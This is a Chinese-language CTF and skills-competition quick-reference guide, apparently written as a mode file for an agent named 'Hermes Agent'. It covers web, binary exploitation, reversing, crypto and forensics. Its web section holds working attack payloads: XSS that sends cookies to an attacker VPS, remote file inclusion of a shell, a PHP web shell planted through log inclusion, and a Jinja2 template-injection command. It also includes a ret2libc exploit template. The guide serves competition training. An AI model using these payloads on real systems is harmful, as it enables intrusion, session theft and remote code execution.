# 竞赛模式：职业技能大赛 / CTF 全方向指南

## 题目类型快速识别

拿到题目后，用以下清单在 30 秒内完成分类：

```
给了 URL / 网页？          → Web 安全
给了二进制文件 + nc地址？  → Pwn（二进制利用）
给了可执行文件无交互？     → Reverse（逆向工程）
给了密文/数学公式/密钥？   → Crypto（密码学）
给了内存镜像/流量包/图片？ → Forensics（取证）
给了奇怪文件/脑洞题？      → Misc（杂项）
```

---

## Web 安全

### 通用侦查流程
```bash
# 1. 目录扫描
dirsearch -u http://target -e php,html,js,txt,bak --timeout 3
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# 2. 技术栈识别
curl -I http://target              # HTTP头
whatweb http://target              # 框架识别
wappalyzer（浏览器插件）

# 3. 源码检查
# F12查看注释、JS文件、robots.txt、.git泄漏
curl http://target/.git/config
git-dumper http://target/.git ./dumped_repo

# 4. 参数模糊测试
ffuf -u http://target/FUZZ -w wordlist.txt
```

### SQL注入
```bash
# 快速检测
sqlmap -u "http://target?id=1" --batch --level=3 --risk=2

# 有cookie
sqlmap -u "http://target/page" --cookie="session=xxx" --dbs

# POST请求
sqlmap -u "http://target/login" --data="user=a&pass=b" --dbs

# 绕过WAF
sqlmap -u "..." --tamper=space2comment,between,randomcase
```

### XSS
```bash
# 自动扫描
xssstrike -u "http://target?q=test"

# 常用payload（记住这些）
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)         # href属性中

# 存储型XSS + 偷cookie
<script>document.location='http://your_vps/steal?c='+document.cookie</script>
```

### 文件包含/路径穿越
```bash
# 本地文件包含
?file=../../../../etc/passwd
?file=php://filter/read=convert.base64-encode/resource=index.php

# 远程文件包含（需 allow_url_include=On）
?file=http://your_vps/shell.php

# 日志包含 → getshell
# 先往User-Agent写shell: <?php system($_GET['cmd']); ?>
# 然后包含: ?file=/var/log/nginx/access.log
```

### SSTI（服务端模板注入）
```python
# 检测payload
{{7*7}}    # 返回49 → 有SSTI
${7*7}     # FreeMarker/Velocity
<%= 7*7 %> # ERB(Ruby)

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# 或用tplmap工具自动利用
```

### 文件上传绕过
```
1. 改Content-Type: image/jpeg
2. 双重扩展名: shell.php.jpg → 配置错误时执行
3. 00截断: shell.php%00.jpg（低版本PHP）
4. 大小写绕过: shell.PHP, shell.PhP
5. .htaccess上传: AddType application/x-httpd-php .jpg
6. 绕过黑名单: .phtml .pht .php3 .php5
```

---

## Pwn（二进制利用）

### 初始侦查
```bash
file ./binary                  # 架构、是否strip
checksec --file=./binary       # 保护机制
strings ./binary | grep -i flag  # 快速找字符串
ltrace ./binary                # 库函数调用
strace ./binary                # 系统调用
```

### 保护机制与对应绕过
```
NX（No Execute）    → ROP链绕过
PIE（地址随机）     → 泄漏基址 或 部分覆盖
Stack Canary       → 泄漏canary值 或 格式化字符串
RELRO Full         → 无法覆盖GOT，改one_gadget或控制流
```

### 常用pwntools模板
```python
from pwn import *

# 本地调试 / 远程切换
LOCAL = False
elf = ELF('./binary')
libc = ELF('./libc.so.6')

if LOCAL:
    p = process('./binary')
    # gdb.attach(p, 'b *main\ncontinue')
else:
    p = remote('target.ip', port)

context.arch = 'amd64'  # or 'i386'
context.log_level = 'debug'

# 栈溢出基础
offset = cyclic_find(0x6161616c)  # 用cyclic(200)找偏移
payload = b'A' * offset + p64(ret_addr)

# ret2libc
payload = flat([b'A'*offset, pop_rdi, puts_got, puts_plt, main_addr])
p.sendlineafter(b'> ', payload)
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

p.interactive()
```

### 格式化字符串
```python
# 泄漏栈数据
payload = b'%p.' * 20         # 逐个泄漏
payload = b'%7$p'             # 泄漏第7个参数

# 任意写（改GOT）
payload = fmtstr_payload(offset, {target_addr: value})
```

---

## Reverse（逆向工程）

### 静态分析流程
```bash
# 1. 文件类型
file ./binary && strings ./binary

# 2. 加壳检测
exeinfo ./binary || PEiD
upx -d ./binary  # UPX脱壳

# 3. Ghidra分析步骤
#    File → New Project → Import File
#    CodeBrowser → Analyze → 找main() → F5反编译
#    重点看：比较函数、循环、字符串引用

# 4. 动态调试（GDB+pwndbg）
gdb ./binary
b main
r
```

### 常见算法识别
```
异或加密:   XOR循环 → 找key，逆向还原
Base64变表: 替换字符表后标准解码
RC4:        KSA+PRGA结构特征
自定义hash: 通常CTF里有弱点，尝试爆破
```

### 脚本自动还原（示例）
```python
# 异或爆破key
cipher = [0x41, 0x42, 0x43, ...]  # 密文
known_plain = b'flag{'
for key in range(256):
    if cipher[0] ^ key == known_plain[0]:
        result = bytes([c ^ key for c in cipher])
        if b'flag' in result:
            print(f"key={key}, flag={result}")
```

---

## Crypto（密码学）

### RSA快速工具箱
```python
from Crypto.Util.number import *

# 已知p,q,e,c
n = p * q
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))

# 工具：RsaCtfTool
python3 RsaCtfTool.py --publickey pub.key --uncipherfile cipher.txt
# 支持: wiener attack, fermat, small e, common factor等
```

### 常见场景速查
```
e=3, 小明文      → 立方根攻击
共用n            → 共模攻击
相近p,q          → Fermat分解
d很小            → Wiener攻击
p泄漏            → 直接算
e=65537,n分解失败 → 尝试factordb.com
```

### 古典密码识别
```
只有A-Z大写        → Caesar(移位) / Vigenere / Affine
摩尔斯码           → 在线解码
栅栏密码           → 规则分组重排
培根密码           → AB二元编码
```

---

## Forensics（取证）

### 文件分析
```bash
file suspicious_file          # 真实类型
binwalk -e suspicious_file    # 提取内嵌文件
foremost -i suspicious_file   # 文件雕刻
exiftool suspicious_file      # 元数据

# 隐写检测
steghide extract -sf image.jpg  # 需要密码
stegsolve.jar                   # LSB图层分析
zsteg image.png                 # PNG隐写

# 图片修复
pngcheck image.png              # 检查PNG完整性
# 修复文件头: 89 50 4E 47（PNG）, FF D8 FF（JPEG）
```

### 内存取证（Volatility3）
```bash
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist         # 进程列表
vol3 -f memory.dmp windows.cmdline        # 命令行历史
vol3 -f memory.dmp windows.filescan       # 文件扫描
vol3 -f memory.dmp windows.dumpfiles --virtaddr 0x...  # 提取文件
vol3 -f memory.dmp windows.hashdump       # 提取密码hash
```

### 流量分析（Wireshark）
```
过滤器速查:
  http                          → HTTP流量
  http.request.method == "POST" → POST请求
  tcp.stream eq 0               → 跟踪第一条TCP流
  dns                           → DNS查询（可能有DNS隧道）
  ftp-data                      → FTP传输数据

提取文件: File → Export Objects → HTTP/SMB
```

---

## 大赛环境快速配置

```bash
# Kali Linux必装
sudo apt update && sudo apt install -y \
  python3-pip pwntools gdb gdb-multiarch \
  binwalk foremost steghide stegsolve \
  wireshark tshark sqlmap gobuster \
  ghidra john hashcat radare2 \
  volatility3 exiftool

pip3 install pwntools ropgadget z3-solver pycryptodome

# Ghidra（免费IDA替代）
wget https://github.com/NationalSecurityAgency/ghidra/releases/latest
# 需要JDK 17+

# pwndbg（增强GDB）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

---

## Write-up 模板

```markdown
# [题目名称] - [类型] - [难度]

## 题目信息
- 平台: [BUUCTF / NSSCTF / 大赛名称]
- 描述: [题目描述]

## 解题思路
1. 初步分析：[file/checksec/源码审计结果]
2. 漏洞点：[发现了什么漏洞/特征]
3. 利用方法：[具体步骤]

## 关键代码/命令
```[语言]
[核心exp/payload]
```

## Flag
`flag{...}`

## 总结
[学到了什么，防御思路]
```

---

## Hermes Agent 竞赛模式输出
```json
{
  "mode": "competition",
  "challenge_type": "web|pwn|reverse|crypto|forensics|misc",
  "challenge_name": "<题目名>",
  "vulnerability": "<漏洞类型>",
  "tools_used": ["<工具列表>"],
  "flag": "<flag或null>",
  "writeup_path": "<writeup存储路径>",
  "habit_hints": {
    "preferred_tools": ["<此类题目惯用工具>"],
    "solve_time_min": 0,
    "difficulty_rating": "easy|medium|hard"
  }
}
```